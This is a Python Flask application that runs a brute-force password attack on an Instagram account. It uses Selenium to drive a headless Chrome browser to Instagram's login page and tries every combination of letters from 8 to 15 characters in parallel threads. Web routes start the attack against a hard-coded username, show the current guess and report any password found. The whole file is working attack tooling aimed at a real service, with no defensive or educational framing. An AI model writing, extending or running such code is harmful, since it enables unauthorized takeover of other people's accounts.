from flask import Flask, render_template, request, redirect, url_for, jsonify
import threading
import itertools
import string
import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from webdriver_manager.chrome import ChromeDriverManager
import os

app = Flask(__name__)

# Global variables
result = {"password": None, "error": None}
current_password = {"password": None}
stop_event = threading.Event()
result_lock = threading.Lock()
password_lock = threading.Lock()

# Function to try a password on Instagram
def try_password_instagram(username, password, results):
    service = Service(ChromeDriverManager().install())
    options = Options()
    options.add_argument('--headless')
    driver = webdriver.Chrome(service=service, options=options)
    
    try:
        driver.get("https://www.instagram.com/accounts/login/")
        time.sleep(5)
        
        username_input = driver.find_element(By.NAME, "username")
        password_input = driver.find_element(By.NAME, "password")
        
        username_input.clear()
        password_input.clear()
        
        username_input.send_keys(username)
        password_input.send_keys(password)
        
        password_input.send_keys(Keys.RETURN)
        
        time.sleep(5)
        
        if "https://www.instagram.com/" in driver.current_url:
            try:
                profile_element = driver.find_element(By.CSS_SELECTOR, 'a[href="/accounts/edit/"]')
                if profile_element.is_displayed():
                    with result_lock:
                        if not result["password"]:
                            result["password"] = password
                            stop_event.set()
                    return True
            except:
                return False
        else:                               
            return False
    except Exception as e:
        with result_lock:
            result["error"] = str(e)
        return False
    finally:
        driver.quit()

# Brute force function
def brute_force_instagram(username, charset, min_length, max_length):
    threads = []

    def worker(password):
        if stop_event.is_set():
            return
        with password_lock:
            current_password["password"] = password
        if try_password_instagram(username, password, []):
            return

    for length in range(min_length, max_length + 1):
        for password_tuple in itertools.product(charset, repeat=length):
            if stop_event.is_set():
                break
            password = ''.join(password_tuple)
            if len(set(password)) == 1:
                continue

            thread = threading.Thread(target=worker, args=(password,))
            threads.append(thread)
            thread.start()

            if len(threads) >= 10:
                for t in threads:
                    t.join()
                threads = []

    for t in threads:
        t.join()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_bruteforce', methods=['POST'])
def start_bruteforce():
    username = "...."
    charset = string.ascii_letters
    min_length = 8
    max_length = 15

    threading.Thread(target=brute_force_instagram, args=(username, charset, min_length, max_length)).start()
    
    return redirect(url_for('results'))

@app.route('/results')
def results():
    return render_template('results.html', password=result.get("password"), error=result.get("error"))

@app.route('/current_password')
def get_current_password():
    with password_lock:
        return jsonify(current_password)

if __name__ == '__main__':
    app.run(debug=True)
